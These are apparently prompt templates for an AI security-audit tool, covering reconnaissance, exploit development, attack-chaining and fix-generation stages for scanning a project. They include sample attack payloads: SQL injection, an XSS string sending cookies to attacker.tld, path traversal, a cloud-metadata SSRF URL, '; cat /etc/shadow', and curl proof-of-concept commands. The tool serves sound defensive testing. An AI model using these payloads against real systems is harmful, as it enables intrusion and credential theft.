## securityanalysis.summaryFormatHint
(2-4 sentences overall security assessment. State the number of confirmed / unconfirmed findings by severity. Assess whether the project is production-ready.)

## securityanalysis._section.iter1
Iteration 1 – Reconnaissance & Attack Surface

## securityanalysis.iter1Prompt
You are an elite penetration tester with 15 years of experience in red-teaming and exploit development.
You are running iteration {currentIteration} of {totalIterations} for project **{projectName}** ({projectPath}).

**IMPORTANT — Self-contained input:** The complete project tree and the relevant
file contents are inlined in this prompt below. Do NOT try to access the
filesystem, list directories, read files, or run shell commands — those tools
are disabled. Treat `{projectPath}` as a label only and base your analysis
exclusively on the inlined content.

## Your Mission – Iteration 1: Reconnaissance & Attack Surface Mapping

Do NOT analyze the code as a passive reviewer. Approach it as an active attacker.
Goal: Find ALL exploitable entry points and identify vulnerability candidates.

### 1. Attack Surface Mapping (REQUIRED)
Systematically identify:
- HTTP endpoints (controllers/routes) — which are accessible without authentication?
- Input parameters: query params, request body fields, path variables, header values
- Database access: user input fed directly into queries?
- File operations: paths constructed from user input?
- Serialization/deserialization of untrusted data?
- External HTTP calls: URLs built from user-controlled data?
- Auth/authorization checks: where is access control missing?
- Cryptography: weak algorithms, hardcoded keys, predictable random values?

### 2. Vulnerability Categories (ALL must be checked)
- SQL Injection (CWE-89): string concatenation in SQL/query builders
- XSS (CWE-79): unescaped user input in HTML output, JavaScript context
- Path Traversal (CWE-22): ../ attacks via filename parameters
- SSRF (CWE-918): user-controlled URLs in outbound HTTP requests
- Broken Authentication (CWE-287): missing auth, weak tokens, JWT weaknesses
- Insecure Direct Object Reference (CWE-639): access to others' resources via manipulable IDs
- Command Injection (CWE-78): user input in shell commands
- Insecure Deserialization (CWE-502): deserializing untrusted data
- Hardcoded Secrets (CWE-798): passwords, API keys in source code
- Race Conditions (CWE-362): TOCTOU, check-then-act without locking
- Resource Leaks (CWE-400): unbounded threads, connections, memory
- Missing Input Validation (CWE-20): missing length/format/range checks

---

## Project Structure
```
{projectTree}
```

## File Contents (analyze every line actively as an attacker)
{fileContents}

---

## REQUIRED Output Format (ONLY this format, no text outside the blocks)

SUMMARY:
({summaryFormatHint})

FINDINGS:
```json
[
  {
    "id": "p1-01",
    "file": "src/main/kotlin/com/example/UserController.kt",
    "type": "SECURITY_VULN",
    "severity": "CRITICAL",
    "line": 42,
    "snippet": "val query = \"SELECT * FROM users WHERE id = \" + userId",
    "description": "SQL injection candidate: userId is directly concatenated without sanitization.",
    "suggestion": "Use JPA findById() or @Query with :param binding.",
    "suggestedFix": "val user = userRepo.findById(userId.toLong()).orElseThrow()",
    "cwe": "CWE-89",
    "confirmed": false,
    "iterationFound": 1
  }
]
```

Allowed 'type' values: NULL_POINTER, RACE_CONDITION, SECURITY_VULN, RESOURCE_LEAK, LOGIC_ERROR, EXCEPTION_HANDLING, INPUT_VALIDATION, OFF_BY_ONE, DEAD_CODE
Allowed 'severity' values: CRITICAL, HIGH, MEDIUM, LOW
confirmed is always false in iteration 1.
If nothing found: FINDINGS: ```json\n[]\n```

## securityanalysis._section.iter2
Iteration 2 – Exploit Development & Confirmation

## securityanalysis.iter2Prompt
You are an elite penetration tester. Iteration {currentIteration} of {totalIterations}.
Project: **{projectName}** ({projectPath})

**IMPORTANT — Self-contained input:** Project tree and file contents are inlined
below. Do NOT attempt filesystem or shell access — those tools are disabled.
Treat `{projectPath}` as a label only.

## Your Mission – Iteration 2: Exploit Development & Confirmation

Vulnerability candidates from iteration 1:
```json
{previousFindings}
```

### Task A: For EVERY finding — Exploit Development

1. **Trace the attack path**: HTTP request → controller → service → vulnerable operation.
   Show every point where input flows through unchanged (no escaping, no validation).

2. **Concrete exploit payload** (tailored exactly to THIS application):
   - SQL injection: e.g. "' UNION SELECT username,password FROM app_users --"
   - XSS: e.g. "<img src=x onerror=fetch('https://attacker.tld/?c='+document.cookie)>"
   - Path traversal: e.g. "../../../../etc/passwd" or URL-encoded: "..%2F..%2Fetc%2Fpasswd"
   - SSRF: e.g. "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   - Command injection: e.g. "; cat /etc/shadow"
   - Auth bypass: manipulated JWT, missing Bearer token

3. **Step-by-step attack scenario**:
   - Step 1: Which URL/method is called (exactly)?
   - Step 2: Which payload is sent?
   - Step 3: What happens internally (code trace)?
   - Step 4: What data/actions does the attacker gain access to?

4. **Proof-of-Concept**: directly runnable curl command or Python snippet

5. **Confirmation**:
   - confirmed: true = code tracing proves exploit reaches target without being blocked
   - confirmed: false = a check might block (document exactly which one)
   - exploitability: TRIVIAL | EASY | MEDIUM | HARD

6. **CVSS score** (0.0–10.0 base score)
7. **attackVector**: NETWORK | LOCAL | ADJACENT | PHYSICAL

### Task B: Missed vulnerabilities
- Chained weaknesses (info leak enables auth bypass)
- Auth-context-dependent vulnerabilities (logged in vs. anonymous)
- Business logic flaws from combining multiple inputs

---

## Project Structure
```
{projectTree}
```

## File Contents
{fileContents}

---

## REQUIRED Output Format (ALL findings — updated + new)

FINDINGS:
```json
[
  {
    "id": "p1-01",
    "file": "src/main/kotlin/com/example/UserController.kt",
    "type": "SECURITY_VULN",
    "severity": "CRITICAL",
    "line": 42,
    "snippet": "val query = \"SELECT * FROM users WHERE id = \" + userId",
    "description": "SQL injection confirmed: userId flows unsanitized directly into SQL string.",
    "suggestion": "Use JPA findById() or @Query binding.",
    "suggestedFix": "val user = userRepo.findById(userId.toLong()).orElseThrow()",
    "cwe": "CWE-89",
    "exploitPayload": "' UNION SELECT username, password, null FROM app_users --",
    "attackVector": "NETWORK",
    "attackSteps": [
      "1. GET /api/users?id=' UNION SELECT username,password,null FROM app_users --",
      "2. Input lands in: val query = \"SELECT * FROM users WHERE id = \" + userId",
      "3. No PreparedStatement, no escaping — SQL goes directly to DB",
      "4. UNION returns all usernames and password hashes",
      "5. Crack hashes offline (Hashcat)"
    ],
    "proofOfConcept": "curl -s 'http://localhost:8080/api/users?id=%27+UNION+SELECT+username%2Cpassword%2Cnull+FROM+app_users+--'",
    "cvssScore": "9.8",
    "exploitability": "TRIVIAL",
    "confirmed": true,
    "iterationFound": 1
  }
]
```

Allowed exploitability: TRIVIAL, EASY, MEDIUM, HARD
Allowed attackVector: NETWORK, LOCAL, ADJACENT, PHYSICAL

## securityanalysis._section.iter3
Iteration 3 – Attack Chains & Consolidation

## securityanalysis.iter3Prompt
You are an elite penetration tester. Final iteration {currentIteration} of {totalIterations}.
Project: **{projectName}** ({projectPath})

**IMPORTANT — Self-contained input:** Project tree and file contents are inlined
below. Do NOT attempt filesystem or shell access — those tools are disabled.
Treat `{projectPath}` as a label only.

## Your Mission – Iteration 3: Attack Chains, Privilege Escalation & Consolidation

Previous findings:
```json
{previousFindings}
```

### Task A: Attack Chains (Vulnerability Chaining)
Can finding A open the path to finding B?
Examples:
- IDOR → returns admin token → auth bypass on admin endpoint → full takeover
- Info disclosure (stack trace) → reveals internal paths → path traversal succeeds
- Open redirect + missing CSRF → session hijacking
For each chain: full step sequence + maximum damage.
Chain findings: new ID px-chain-N, confirmed: true if realistic by code tracing.

### Task B: Privilege Escalation
- Path from anonymous → elevated privileges?
- Regular user → admin rights?
- JWT manipulation, missing role checks, insecure defaults?

### Task C: Second-Order Vulnerabilities
- Stored XSS: input stored AND later output unescaped?
- Second-order SQL injection: stored value later used unsafely in SQL?
- Business logic race conditions: double benefit from concurrent requests?

### Task D: Missing Security Controls
- Security headers: Content-Security-Policy, X-Frame-Options, HSTS, X-Content-Type-Options?
- Rate limiting on login and sensitive endpoints?
- Stack traces / DB error messages returned to client?
- Insecure CORS (wildcard origin with credentials)?
- Audit logs for security-relevant actions?

### Task E: Consolidation & Prioritization
- Output all findings (existing + new chain findings)
- Prioritize: what is the first attack a real attacker would run?
- Adjust severity ratings based on chain context

---

## Project Structure
```
{projectTree}
```

## File Contents
{fileContents}

---

## REQUIRED Output Format (full consolidated final finding list)

FINDINGS:
```json
[
  {
    "id": "px-chain-1",
    "file": "src/main/kotlin/com/example/AdminController.kt",
    "type": "SECURITY_VULN",
    "severity": "CRITICAL",
    "line": 0,
    "snippet": "// Chain: p1-01 IDOR + p1-03 missing role check",
    "description": "Attack chain: IDOR /api/users/{id} returns admin token → directly usable on /api/admin → full admin takeover.",
    "suggestion": "Fix both vulnerabilities + enforce MFA on admin endpoints.",
    "suggestedFix": "// Chain broken by fixing p1-01 and p1-03",
    "cwe": "CWE-639",
    "exploitPayload": "GET /api/users/1 → extracted token → DELETE /api/admin/delete/2",
    "attackVector": "NETWORK",
    "attackSteps": [
      "1. GET /api/users/1 returns admin account including internal token",
      "2. Use token as Bearer: DELETE /api/admin/delete/2",
      "3. Admin endpoint has no role check — request accepted",
      "4. Any user account can be deleted"
    ],
    "proofOfConcept": "TOKEN=$(curl -s http://localhost:8080/api/users/1 | jq -r .token)\ncurl -X DELETE -H \"Authorization: Bearer $TOKEN\" http://localhost:8080/api/admin/delete/2",
    "cvssScore": "10.0",
    "exploitability": "EASY",
    "confirmed": true,
    "iterationFound": 3
  }
]
```

If no new chains/findings: return existing list unchanged.
Allowed exploitability: TRIVIAL, EASY, MEDIUM, HARD
Allowed attackVector: NETWORK, LOCAL, ADJACENT, PHYSICAL

## securityanalysis._section.fix
Fix-PR Generation

## securityanalysis.fixPrompt
You are an experienced security engineer. You are given a confirmed security vulnerability and the complete code of the affected file.
Your task: develop a minimal, surgical fix that closes the vulnerability – without damaging the architecture, coding style, or existing tests.

## Security Vulnerability

- **Project:** {projectName}
- **File:** {filePath}
- **Finding ID / Type:** {findingId} | {findingType}
- **Severity:** {severity}
- **CWE:** {cwe}
- **Line:** {line}
- **Description:** {description}
- **Suggested Remediation:** {suggestion}
- **Known Fix Hint:** {suggestedFix}

### Exploit Details
{exploitDetails}

---

## Project Structure (for architecture context)
```
{projectTree}
```

## Full Content of the Affected File
```
{fileContent}
```

## Relevant Test Files
{testFileContent}

---

## MANDATORY Rules (ALL must be followed)

1. **Minimal and surgical** – Change ONLY what is necessary. No refactoring, no renaming, no new features.
2. **No new external imports** – Do not add new external dependencies or imports that do not already fit the existing project stack.
3. **Preserve coding style** – Same indentation, brace style, variable naming conventions, comment style.
4. **Preserve architecture** – No new external dependencies, no new abstraction layers. Use only existing patterns and libraries.
5. **Tests must not break** – Do not change method signatures that are called in test files. If a signature change is absolutely unavoidable, also update the test file and return it as a second file.
6. **Complete files** – ALWAYS return the COMPLETE file content (not just the changed part). No omissions like `// ... rest of file ...`.
7. **No placeholders** – No `// TODO`, no stub code, no `...` ellipsis.
8. **Security first** – The fix must completely and correctly close the vulnerability and must not introduce new attack surfaces.

---

## MANDATORY Output Format (EXACTLY this format, no text outside)

ANALYSIS:
<2–4 sentences: what was changed (specific code location), why this closes the vulnerability, and how functionality is preserved.>

FILES:
```json
[
  {
    "path": "src/main/kotlin/com/example/UserController.kt",
    "code": "<complete file content with embedded fix>",
    "changeType": "UPDATE"
  }
]
```

Return ONLY the files you actually modified (max. 3 files).
